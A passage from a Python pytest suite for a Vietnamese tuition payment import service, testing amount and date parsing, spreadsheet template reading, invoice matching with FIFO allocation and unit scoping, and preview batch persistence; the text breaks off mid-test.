# tests/services/test_payment_import_service.py
"""
Tests for payment_import_service (BV-2): parse + resolve/validate + preview batch.

Phủ:
- Parse: VN-number, quantize 2 dp, ngày (text + chuỗi datetime Excel), CCCD giữ số 0
  đầu (dtype=str), map hình thức, row_no = dòng bảng tính, bỏ dòng trống.
- Resolve READ-ONLY: khớp/không thấy/fee cancelled/đợt draft/vượt tổng/FIFO nhiều
  đợt/trùng-trong-file/lệch tên/IDOR/lead xóa mềm/CMND 9 số/principal-first (bỏ phạt).
- create_preview_batch / preview_import: persist batch 'preview' + rows, CCCD lỗi →
  citizen_id NULL, thay preview cũ cùng file, file đã committed → ConflictError.

KHÔNG ghi Payment (đó là BV-3).
"""
import io
import itertools
from datetime import date, datetime, timezone
from decimal import Decimal

import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app import models
from app.models.finance import (
    Fee,
    Invoice,
    Payment,
    PaymentImportBatch,
    PaymentImportBatchStatusEnum,
    PaymentImportRow,
    PaymentImportRowStatusEnum,
    PaymentMethod,
    PaymentTransaction,
)
from app.services import payment_import_service as pis
from app.utils.exceptions import (
    BadRequest,
    BusinessRuleViolation,
    ConflictError,
    ResourceNotFoundError,
)

MATCHED = PaymentImportRowStatusEnum.matched.value
WARNED = PaymentImportRowStatusEnum.warned.value
ERROR = PaymentImportRowStatusEnum.error.value

_phone_seq = itertools.count(1)


# =============================================================================
# Helpers
# =============================================================================
def _xlsx_bytes(rows: list) -> bytes:
    """rows[0] = header; phần còn lại = dữ liệu (ô có thể là date/datetime thật)."""
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    for r in rows:
        ws.append(r)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def _csv_bytes(rows: list) -> bytes:
    import csv

    buf = io.StringIO()
    w = csv.writer(buf)
    for r in rows:
        w.writerow(r)
    return buf.getvalue().encode("utf-8")


def _draft(
    citizen_id,
    amount,
    *,
    name="",
    row_no=2,
    method="cash",
    reference="",
    note="",
    payment_date=None,
    parse_error=None,
) -> "pis.RowDraft":
    return pis.RowDraft(
        row_no=row_no,
        citizen_id=citizen_id,
        name=name,
        amount=(Decimal(str(amount)) if amount is not None else None),
        payment_date=payment_date or date(2026, 9, 5),
        method_code=method,
        reference=reference,
        note=note,
        raw={pis.COL_CCCD: citizen_id, pis.COL_AMOUNT: str(amount)},
        parse_error=parse_error,
    )


async def _seed_tuition(
    db: AsyncSession,
    deps: dict,
    *,
    citizen_id: str,
    invoices: list,  # [(installment_no, amount, status, paid, penalty)]
    year: int = 2026,
    semester: int = 1,
    lead_name: str = "Nguyễn Văn An",
    unit_id: int = None,
    deleted_at: datetime = None,
):
    """Dựng chain Lead → AdmissionProfile(citizen_id) → Fee(tuition) → Invoice(s)."""
    lead = models.Lead(
        full_name=lead_name,
        phone=f"09{next(_phone_seq):08d}",
        source="bulk_test",
        unit_id=unit_id or deps["unit_id"],
        consultation_status_id=deps["initial_status_id"],
        deleted_at=deleted_at,
    )
    db.add(lead)
    await db.flush()

    profile = models.AdmissionProfile(
        lead_id=lead.id,
        status="submitted",
        academic_year=year,
        applied_rules={},
        citizen_id=citizen_id,
    )
    db.add(profile)
    await db.flush()

    # fee thực tế = tổng các đợt (invoice) — thu đủ → fee 'paid'.
    fee_total = sum(
        (Decimal(str(amt)) for (_no, amt, *_rest) in invoices), Decimal("0")
    )
    fee = Fee(
        admission_profile_id=profile.id,
        fee_type="tuition",
        academic_year=year,
        semester_no=semester,
        base_amount=fee_total,
        final_amount=fee_total,
        status="invoiced",
    )
    db.add(fee)
    await db.flush()

    inv_objs = []
    for no, amount, st, paid, penalty in invoices:
        inv = Invoice(
            fee_id=fee.id,
            invoice_number=f"INV-T-{citizen_id}-{no}",
            installment_no=no,
            amount=Decimal(str(amount)),
            paid_amount=Decimal(str(paid)),
            penalty_amount=Decimal(str(penalty)),
            status=st,
            due_date=date(year, 9, 5),
        )
        db.add(inv)
        inv_objs.append(inv)
    await db.flush()
    return profile, fee, inv_objs


# =============================================================================
# Parse helpers (pure — no DB)
# =============================================================================
class TestParseAmount:
    def test_thousands_dot_separator(self):
        assert pis.parse_amount_vn("7.200.000") == Decimal("7200000")

    def test_decimal_comma(self):
        assert pis.parse_amount_vn("7.200.000,50") == Decimal("7200000.50")

    def test_float_string_from_excel(self):
        # "7200000.0" — nhóm cuối 1 chữ số → '.' là thập phân, không phải nghìn
        assert pis.parse_amount_vn("7200000.0") == Decimal("7200000.00")

    def test_quantize_three_decimals(self):
        # Finding 4: >2 chữ số thập phân phải quantize về 2 dp (cột Numeric(15,2))
        v = pis.parse_amount_vn("7.200.000,505")
        assert v == Decimal("7200000.51")
        assert v.as_tuple().exponent == -2

    def test_rejects_zero(self):
        with pytest.raises(ValueError):
            pis.parse_amount_vn("0")

    def test_rejects_negative(self):
        with pytest.raises(ValueError):
            pis.parse_amount_vn("-5000")

    def test_rejects_garbage(self):
        with pytest.raises(ValueError):
            pis.parse_amount_vn("abc")

    def test_us_locale_thousands_comma(self):
        # Fix #7: chuỗi locale US (',' = nghìn) phải parse đúng, không reject hàng loạt
        assert pis.parse_amount_vn("7,200,000") == Decimal("7200000")
        assert pis.parse_amount_vn("7,200,000.00") == Decimal("7200000.00")
        assert pis.parse_amount_vn("1,234,567.50") == Decimal("1234567.50")

    def test_single_comma_still_vn_decimal(self):
        # Không regress: 1 dấu ',' + 1-2 chữ số giữ nghĩa thập phân VN
        assert pis.parse_amount_vn("7,50") == Decimal("7.50")
        assert pis.parse_amount_vn("7,5") == Decimal("7.5")

    def test_single_comma_three_digits_is_thousands(self):
        # P1: ',' đơn + ĐÚNG 3 chữ số = phân cách nghìn (VND nguyên), KHÔNG thập phân.
        # Trước đây '500,000' -> 500.000 -> 500.00 = GHI NHẦM 500đ thay vì 500.000đ.
        assert pis.parse_amount_vn("500,000") == Decimal("500000")
        assert pis.parse_amount_vn("7,500") == Decimal("7500")
        assert pis.parse_amount_vn("1,200") == Decimal("1200")

    def test_malformed_groups_rejected(self):
        # Fix #9: nhóm nghìn sai (nhóm giữa ≠3) KHÔNG được nối thầm thành số
        for bad in ("1.23.456", "1,23,456", "12.34.567"):
            with pytest.raises(ValueError):
                pis.parse_amount_vn(bad)

    def test_amount_over_column_max_rejected(self):
        # Fix #2: số quá lớn tràn Numeric(15,2) → lỗi sạch, không 500 ở persist
        with pytest.raises(ValueError):
            pis.parse_amount_vn("99999999999999")  # 14 số 9 > 9.999.999.999.999,99

    def test_nbsp_whitespace_separator(self):
        # File ngân hàng/Excel: '7 200 000' với non-breaking space (NBSP   /
        # narrow  ) — phải bỏ HẾT whitespace, không chỉ space thường.
        assert pis.parse_amount_vn("7 200 000") == Decimal("7200000")
        assert pis.parse_amount_vn("7 200 000") == Decimal("7200000")
        assert pis.parse_amount_vn("7 200 000") == Decimal("7200000")


class TestParseDate:
    def test_vn_slash(self):
        assert pis.parse_date_vn("05/09/2026") == date(2026, 9, 5)

    def test_vn_dash(self):
        assert pis.parse_date_vn("05-09-2026") == date(2026, 9, 5)

    def test_iso(self):
        assert pis.parse_date_vn("2026-09-05") == date(2026, 9, 5)

    def test_excel_datetime_string(self):
        # Finding 1: ô Date Excel đọc dtype=str → "2026-09-05 00:00:00" (kèm giờ)
        assert pis.parse_date_vn("2026-09-05 00:00:00") == date(2026, 9, 5)

    def test_excel_iso_t_separator(self):
        assert pis.parse_date_vn("2026-09-05T00:00:00") == date(2026, 9, 5)

    def test_empty_raises(self):
        with pytest.raises(ValueError):
            pis.parse_date_vn("")

    def test_invalid_raises(self):
        with pytest.raises(ValueError):
            pis.parse_date_vn("hôm qua")

    def test_two_digit_year_rejected(self):
        # strptime %Y nuốt năm 2 số → 0026; phải chặn (BV-3 sẽ ghi Payment năm 0026).
        with pytest.raises(ValueError):
            pis.parse_date_vn("05/09/26")

    def test_out_of_range_year_rejected(self):
        with pytest.raises(ValueError):
            pis.parse_date_vn("05/09/1999")


# =============================================================================
# parse_template (builds real files)
# =============================================================================
class TestParseTemplate:
    def _header(self):
        return pis.TEMPLATE_COLS

    def test_cccd_leading_zero_preserved(self):
        # CCCD text "001234567890" KHÔNG bị cắt thành 1234567890
        content = _xlsx_bytes(
            [
                self._header(),
                [
                    "001234567890",
                    "Nguyễn Văn An",
                    "7.200.000",
                    "05/09/2026",
                    "TM",
                    "",
                    "",
                ],
            ]
        )
        drafts = pis.parse_template(content, "f.xlsx")
        assert len(drafts) == 1
        assert drafts[0].citizen_id == "001234567890"
        assert drafts[0].amount == Decimal("7200000")
        assert drafts[0].parse_error is None

    def test_excel_real_date_cell(self):
        # Finding 1 (regression chính): ô Date THẬT của Excel → không false-error
        content = _xlsx_bytes(
            [
                self._header(),
                ["001234567890", "An", "7.200.000", date(2026, 9, 5), "CK", "", ""],
            ]
        )
        drafts = pis.parse_template(content, "f.xlsx")
        assert drafts[0].parse_error is None
        assert drafts[0].payment_date == date(2026, 9, 5)
        assert drafts[0].method_code == "bank_transfer"

    def test_method_mapping(self):
        rows = [self._header()]
        for m in ("TM", "CK", "Chuyển khoản", "tiền mặt"):
            rows.append(["001234567890", "An", "1.000.000", "05/09/2026", m, "", ""])
        drafts = pis.parse_template(_xlsx_bytes(rows), "f.xlsx")
        assert [d.method_code for d in drafts] == [
            "cash",
            "bank_transfer",
            "bank_transfer",
            "cash",
        ]

    def test_invalid_method_sets_parse_error(self):
        content = _xlsx_bytes(
            [
                self._header(),
                ["001234567890", "An", "1.000.000", "05/09/2026", "Bitcoin", "", ""],
            ]
        )
        drafts = pis.parse_template(content, "f.xlsx")
        assert drafts[0].method_code is None
        assert "hình thức" in drafts[0].parse_error

    def test_row_no_matches_spreadsheet_and_skips_blank(self):
        # Finding 5: header = dòng 1; dòng trống bị bỏ; row_no khớp Excel
        content = _xlsx_bytes(
            [
                self._header(),
                ["", "", "", "", "", "", ""],  # dòng 2 — trống → bỏ
                [
                    "001234567890",
                    "An",
                    "1.000.000",
                    "05/09/2026",
                    "TM",
                    "",
                    "",
                ],  # dòng 3
            ]
        )
        drafts = pis.parse_template(content, "f.xlsx")
        assert len(drafts) == 1
        assert drafts[0].row_no == 3

    def test_missing_required_column_raises(self):
        content = _xlsx_bytes(
            [
                [pis.COL_CCCD, pis.COL_AMOUNT, pis.COL_DATE],  # thiếu "Hình thức"
                ["001234567890", "1.000.000", "05/09/2026"],
            ]
        )
        with pytest.raises(BadRequest):
            pis.parse_template(content, "f.xlsx")

    def test_csv_also_supported(self):
        content = _csv_bytes(
            [
                self._header(),
                [
                    "001234567890",
                    "An",
                    "1.000.000",
                    "05/09/2026",
                    "TM",
                    "PT-1",
                    "ghi chú",
                ],
            ]
        )
        drafts = pis.parse_template(content, "f.csv")
        assert drafts[0].citizen_id == "001234567890"
        assert drafts[0].reference == "PT-1"

    def test_header_with_trailing_space_accepted(self):
        # Fix #10: tên cột thừa khoảng trắng vẫn nhận đúng (strip header)
        header = [c + " " for c in pis.TEMPLATE_COLS]
        content = _xlsx_bytes(
            [
                header,
                ["001234567890", "An", "1.000.000", "05/09/2026", "TM", "", ""],
            ]
        )
        drafts = pis.parse_template(content, "f.xlsx")
        assert len(drafts) == 1
        assert drafts[0].citizen_id == "001234567890"
        assert drafts[0].parse_error is None

    def test_data_on_second_sheet_found(self):
        # Fix #8: data ở sheet 2 (sau sheet "Hướng dẫn") KHÔNG bị bỏ thầm
        from openpyxl import Workbook

        wb = Workbook()
        ws0 = wb.active
        ws0.title = "Huong dan"
        ws0.append(["Hướng dẫn điền form"])
        ws1 = wb.create_sheet("Du lieu")
        ws1.append(pis.TEMPLATE_COLS)
        ws1.append(["001234567890", "An", "1.000.000", "05/09/2026", "TM", "", ""])
        buf = io.BytesIO()
        wb.save(buf)
        drafts = pis.parse_template(buf.getvalue(), "f.xlsx")
        assert len(drafts) == 1
        assert drafts[0].citizen_id == "001234567890"

    def test_raw_not_csv_sanitized(self):
        # Fix #3: reference '-...' KHÔNG bị chèn ' vào raw (sanitize=việc export)
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["001234567890", "An", "1.000.000", "05/09/2026", "TM", "-PT123", ""],
            ]
        )
        drafts = pis.parse_template(content, "f.csv")
        assert drafts[0].raw[pis.COL_REF] == "-PT123"  # KHÔNG có dấu ' đầu
        assert drafts[0].reference == "-PT123"

    def test_reference_too_long_is_parse_error(self):
        # Fix P2(ref-len): ref > 100 ký tự (cột String(100)) → lỗi dòng sạch, không 500
        long_ref = "X" * 101
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["001234567890", "An", "1.000.000", "05/09/2026", "TM", long_ref, ""],
            ]
        )
        drafts = pis.parse_template(content, "f.csv")
        assert drafts[0].parse_error is not None
        assert "tham chiếu" in drafts[0].parse_error

    def test_duplicate_columns_after_strip_rejected(self):
        # Re-review fix: 'Số CCCD' + 'Số CCCD ' (thừa space) → sau strip TRÙNG tên →
        # row.get trả Series → rác. Phải BadRequest rõ ràng, KHÔNG parse rác âm thầm.
        header = list(pis.TEMPLATE_COLS) + ["Số CCCD "]
        content = _csv_bytes(
            [
                header,
                ["001234567890", "An", "1.000.000", "05/09/2026", "TM", "P", "", "X"],
            ]
        )
        with pytest.raises(BadRequest):
            pis.parse_template(content, "f.csv")


# =============================================================================
# resolve_and_validate (DB, READ-ONLY)
# =============================================================================
class TestBuildTemplate:
    """Generator file mẫu (build_template) — pure, không qua DB."""

    def test_csv_has_bom_and_parses_back(self):
        content, media, fname = pis.build_template("csv")
        assert content[:3] == b"\xef\xbb\xbf"  # BOM utf-8-sig cho Excel VN
        assert fname.endswith(".csv")
        drafts = pis.parse_template(content, "t.csv")
        assert drafts[0].citizen_id == "001234567890"  # round-trip giữ số 0 đầu

    def test_xlsx_parses_back_with_text_cccd(self):
        content, media, fname = pis.build_template("xlsx")
        assert fname.endswith(".xlsx")
        assert "spreadsheet" in media
        drafts = pis.parse_template(content, "t.xlsx")
        assert len(drafts) == 1
        assert drafts[0].citizen_id == "001234567890"
        assert drafts[0].payment_date == date(2026, 9, 5)
        assert drafts[0].method_code == "cash"

    def test_xlsx_cccd_text_format_covers_full_range(self):
        # Finding 3: number_format='@' phải phủ tới HẾT MAX_IMPORT_ROWS (không chỉ
        # ~1000 dòng đầu) — nếu không file > N dòng mất số 0 đầu CCCD.
        import io as _io

        from openpyxl import load_workbook

        content, _, _ = pis.build_template("xlsx")
        ws = load_workbook(_io.BytesIO(content)).active
        cccd_col = pis.TEMPLATE_COLS.index(pis.COL_CCCD) + 1
        letter = ws.cell(row=1, column=cccd_col).column_letter
        last = pis.MAX_IMPORT_ROWS + 1  # dòng dữ liệu cuối cùng
        assert ws[f"{letter}{last}"].number_format == "@"

    def test_default_format_is_xlsx(self):
        _, _, fname = pis.build_template("")
        assert fname.endswith(".xlsx")


class TestResolveValidate:
    @pytest.fixture(autouse=True)
    async def _methods(self, db):
        # G2: resolve nay validate hình thức ACTIVE → seed cash (active) cho mọi test.
        # KHÔNG seed bank_transfer → dùng để test method inactive/missing.
        await _seed_cash_method(db)

    async def test_matched_single_invoice(self, db, seeded_dependencies):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "10000000")], 2026, 1, None
        )
        row = res.rows[0]
        assert row.status == MATCHED
        assert res.matched_count == 1 and res.failed_count == 0
        assert len(row.allocations) == 1
        assert row.allocations[0].amount == Decimal("10000000")
        assert res.total_amount == Decimal("10000000")

    async def test_cccd_not_found(self, db, seeded_dependencies):
        res = await pis.resolve_and_validate(
            db, [_draft("009999999999", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "không tìm thấy" in res.rows[0].message

    async def test_cmnd_9_digits_is_error(self, db, seeded_dependencies):
        res = await pis.resolve_and_validate(
            db, [_draft("123456789", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "12 chữ số" in res.rows[0].message

    async def test_fee_cancelled_only_is_error(self, db, seeded_dependencies):
        # Finding 3: fee cancelled vẫn giữ slot index → phải lọc status
        _, fee, _ = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        fee.status = "cancelled"
        await db.flush()
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "học phí" in res.rows[0].message

    async def test_only_draft_invoice_is_error(self, db, seeded_dependencies):
        # Finding 12: đợt draft chưa phát hành → không payable → LỖI.
        # Message tách riêng nhánh 'nháp' (cần phát hành) — KHÔNG gộp 'hoặc đã thu đủ'.
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "draft", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "đợt còn nháp" in res.rows[0].message
        assert "phát hành" in res.rows[0].message
        assert "đã thu đủ" not in res.rows[0].message  # không còn gộp 2 ca

    async def test_fully_paid_invoice_is_error_distinct_message(
        self, db, seeded_dependencies
    ):
        # Hồ sơ đã đóng đủ (mọi đợt 'paid') → không payable → LỖI với message RIÊNG
        # "học phí đã thu đủ" (phân biệt với nhánh 'đợt còn nháp').
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "paid", "10000000", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert res.rows[0].message == "học phí đã thu đủ"

    async def test_overpay_total_principal_is_error(self, db, seeded_dependencies):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "10000001")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "vượt tổng còn nợ" in res.rows[0].message

    async def test_fifo_two_invoices_warns(self, db, seeded_dependencies):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[
                (1, "4000000", "issued", "0", "0"),
                (2, "6000000", "issued", "0", "0"),
            ],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "7000000")], 2026, 1, None
        )
        row = res.rows[0]
        assert row.status == WARNED
        assert len(row.allocations) == 2
        assert row.allocations[0].amount == Decimal("4000000")  # đợt 1 đầy trước
        assert row.allocations[1].amount == Decimal("3000000")  # tràn 3tr sang đợt 2
        assert "phân bổ" in row.message

    async def test_duplicate_in_file_second_sees_reduced(self, db, seeded_dependencies):
        # Finding 9: 2 dòng cùng CCCD+kỳ → dòng 2 thấy số dư đã trừ
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db,
            [
                _draft("001234567890", "6000000", row_no=2),
                _draft("001234567890", "6000000", row_no=3),
            ],
            2026,
            1,
            None,
        )
        assert res.rows[0].status == WARNED  # G1: trùng CCCD+cùng tiền → cảnh báo
        assert "nghi copy" in res.rows[0].message
        assert res.rows[1].status == ERROR  # 6tr > 4tr còn lại
        assert "vượt tổng còn nợ" in res.rows[1].message

    async def test_name_mismatch_warns(self, db, seeded_dependencies):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            lead_name="Nguyễn Văn An",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000", name="Trần Thị Bích")], 2026, 1, None
        )
        row = res.rows[0]
        assert row.status == WARNED
        assert "tên lệch" in row.message

    async def test_principal_first_ignores_penalty(self, db, seeded_dependencies):
        # Finding 8: principal_rem = amount − paid (KHÔNG ăn penalty).
        # invoice amount=10tr, penalty=1tr → remaining_amount(property)=11tr nhưng
        # bulk chỉ tính 10tr gốc.
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "1000000")],
        )
        # trả đúng 10tr gốc → matched (1 alloc = 10tr)
        ok = await pis.resolve_and_validate(
            db, [_draft("001234567890", "10000000")], 2026, 1, None
        )
        assert ok.rows[0].status == MATCHED
        assert ok.rows[0].allocations[0].amount == Decimal("10000000")
        # trả 10tr + 1đ → vượt gốc 10tr (dù remaining gồm penalty là 11tr) → ERROR
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567891",
            invoices=[(1, "10000000", "issued", "0", "1000000")],
        )
        over = await pis.resolve_and_validate(
            db, [_draft("001234567891", "10000001")], 2026, 1, None
        )
        assert over.rows[0].status == ERROR
        assert "vượt tổng còn nợ" in over.rows[0].message

    async def test_partial_paid_principal_remaining(self, db, seeded_dependencies):
        # đã trả 4tr gốc → còn 6tr; trả 6tr → matched, trả 6tr+1 → error
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "partial", "4000000", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "6000000")], 2026, 1, None
        )
        assert res.rows[0].status == MATCHED
        assert res.rows[0].allocations[0].amount == Decimal("6000000")

    async def test_idor_other_unit_not_found(
        self, db, seeded_dependencies, second_unit
    ):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            unit_id=second_unit.id,
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        # kế toán unit 1001 → không thấy hồ sơ unit 2001
        scoped = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "1000000")],
            2026,
            1,
            seeded_dependencies["unit_id"],
        )
        assert scoped.rows[0].status == ERROR
        assert "không tìm thấy" in scoped.rows[0].message
        # admin (unit_id=None) → thấy
        glob = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 1, None
        )
        assert glob.rows[0].status == MATCHED

    async def test_soft_deleted_lead_not_found(self, db, seeded_dependencies):
        # Finding 2: hồ sơ của lead đã xóa mềm KHÔNG được khớp
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            deleted_at=datetime.now(timezone.utc),
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "không tìm thấy" in res.rows[0].message

    async def test_wrong_semester_is_error(self, db, seeded_dependencies):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            semester=1,
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("001234567890", "1000000")], 2026, 2, None
        )  # hỏi HK2
        assert res.rows[0].status == ERROR
        assert "chưa được thiết lập học phí HK2" in res.rows[0].message

    async def test_payment_date_far_from_year_warns(self, db, seeded_dependencies):
        # Fix #5: ngày thu lệch xa năm học → WARNED (surface ở preview), không chặn cứng
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        d = _draft("001234567890", "1000000", payment_date=date(2030, 9, 5))
        res = await pis.resolve_and_validate(db, [d], 2026, 1, None)
        assert res.rows[0].status == WARNED
        assert "lệch xa năm học" in res.rows[0].message

    async def test_g1_duplicate_cccd_same_amount_warns_copy(
        self, db, seeded_dependencies
    ):
        # G1: 2 dòng cùng CCCD + CÙNG số tiền (nghi copy nhầm → thu khống) → cả 2
        # WARNED, message "nghi copy". Cả 2 vẫn lọt nợ (10tr) nên không bị "vượt nợ".
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db,
            [
                _draft("001234567890", "1000000", row_no=2),
                _draft("001234567890", "1000000", row_no=3),
            ],
            2026,
            1,
            None,
        )
        assert res.rows[0].status == WARNED
        assert res.rows[1].status == WARNED
        assert "nghi copy" in res.rows[0].message
        assert res.warned_count == 2 and res.matched_count == 0

    async def test_g1_duplicate_cccd_diff_amount_warns_not_copy(
        self, db, seeded_dependencies
    ):
        # G1: cùng CCCD KHÁC số tiền (tách đợt hợp lệ) → WARNED "kiểm tra trùng",
        # KHÔNG "copy".
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db,
            [
                _draft("001234567890", "1000000", row_no=2),
                _draft("001234567890", "2000000", row_no=3),
            ],
            2026,
            1,
            None,
        )
        assert res.rows[0].status == WARNED
        assert "kiểm tra trùng" in res.rows[0].message
        assert "copy" not in res.rows[0].message

    async def test_g2_method_inactive_is_error(self, db, seeded_dependencies):
        # G2: hình thức map-OK theo text (bank_transfer) nhưng PaymentMethod INACTIVE
        # trong DB → ERROR ngay ở preview (đối xứng commit:1017, hết "khớp giả").
        # Parser :346 đã chặn text lạ; đây test nhánh inactive/missing.
        db.add(
            PaymentMethod(
                code="bank_transfer", name="CK", is_online=False, is_active=False
            )
        )
        await db.flush()
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "1000000", method="bank_transfer")],
            2026,
            1,
            None,
        )
        assert res.rows[0].status == ERROR
        assert "kích hoạt" in res.rows[0].message


# =============================================================================
# create_preview_batch / preview_import (DB persistence)
# =============================================================================
class TestPreviewBatch:
    @pytest.fixture(autouse=True)
    async def _methods(self, db):
        # G2: preview_import → resolve nay cần hình thức ACTIVE → seed cash.
        await _seed_cash_method(db)

    async def test_preview_import_persists_batch_and_rows(
        self, db, seeded_dependencies, admin_user
    ):
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                [
                    "001234567890",
                    "Nguyễn Văn An",
                    "10.000.000",
                    "05/09/2026",
                    "TM",
                    "",
                    "",
                ],  # matched (tên khớp seed)
                ["009999999999", "X", "1.000.000", "05/09/2026", "TM", "", ""],  # error
            ]
        )
        batch, preview = await pis.preview_import(
            db,
            content=content,
            filename="thu.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_user.id,
            unit_id=None,
        )
        await db.commit()

        assert batch.status == PaymentImportBatchStatusEnum.preview.value
        assert batch.row_count == 2
        assert batch.matched_count == 1 and batch.failed_count == 1
        assert batch.total_amount == Decimal("10000000")

        rows = (
            (
                await db.execute(
                    select(PaymentImportRow)
                    .where(PaymentImportRow.batch_id == batch.id)
                    .order_by(PaymentImportRow.row_no)
                )
            )
            .scalars()
            .all()
        )
        assert len(rows) == 2
        assert rows[0].status == MATCHED and rows[0].citizen_id == "001234567890"
        assert rows[0].resolved_profile_id is not None
        assert rows[1].status == ERROR

    async def test_invalid_cccd_row_stores_null_citizen_id(
        self, db, seeded_dependencies, admin_user
    ):
        # CCCD 9 số (CMND) → cột String(12) lưu NULL, raw giữ giá trị gốc
        content = _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["123456789", "X", "1.000.000", "05/09/2026", "TM", "", ""],
            ]
        )
        batch, _ = await pis.preview_import(
            db,
            content=content,
            filename="thu.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_user.id,
            unit_id=None,
        )
        await db.commit()
        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch.id)
            )
        ).scalar_one()
        assert row.status == ERROR
        assert row.citizen_id is None  # không tràn cột String(12)
        assert row.raw.get(pis.COL_CCCD) == "123456789"  # gốc vẫn audit được

    async def test_replaces_stale_preview_same_file(
        self, db, seeded_dependencies, admin_user
    ):
        sha = "a" * 64
        p1 = pis.PreviewResult(
            rows=[pis.RowResult(row_no=2, status=ERROR, raw={})],
            matched_count=0,
            warned_count=0,
            failed_count=1,
            total_amount=Decimal("0"),
        )
        b1 = await pis.create_preview_batch(
            db,
            preview=p1,
            academic_year=2026,
            semester_no=1,
            file_name="f.csv",
            file_sha256_hex=sha,
            created_by_id=admin_user.id,
        )
        await db.flush()
        b1_id = b1.id

        # preview lại CÙNG file (sha) — nội dung khác (2 dòng) → thay batch cũ
        p2 = pis.PreviewResult(
            rows=[
                pis.RowResult(row_no=2, status=ERROR, raw={}),
                pis.RowResult(row_no=3, status=ERROR, raw={}),
            ],
            matched_count=0,
            warned_count=0,
            failed_count=2,
            total_amount=Decimal("0"),
        )
        b2 = await pis.create_preview_batch(
            db,
            preview=p2,
            academic_year=2026,
            semester_no=1,
            file_name="f.csv",
            file_sha256_hex=sha,
            created_by_id=admin_user.id,
        )
        await db.commit()

        batches = (
            (
                await db.execute(
                    select(PaymentImportBatch).where(
                        PaymentImportBatch.file_sha256 == sha
                    )
                )
            )
            .scalars()
            .all()
        )
        assert len(batches) == 1  # batch cũ đã bị thay
        assert batches[0].id == b2.id
        assert batches[0].row_count == 2
        # child rows của batch cũ phải bị cascade-xóa (không để mồ côi)
        old_rows = (
            (
                await db.execute(
                    select(PaymentImportRow).where(PaymentImportRow.batch_id == b1_id)
                )
            )
            .scalars()
            .all()
        )
        assert old_rows == []

    async def test_committed_file_conflicts(self, db, seeded_dependencies, admin_user):
        sha = "b" * 64
        committed = PaymentImportBatch(
            academic_year=2026,
            semester_no=1,
            file_name="old.csv",
            file_sha256=sha,
            status=PaymentImportBatchStatusEnum.committed.value,
            committed_at=datetime.now(timezone.utc),
            row_count=1,
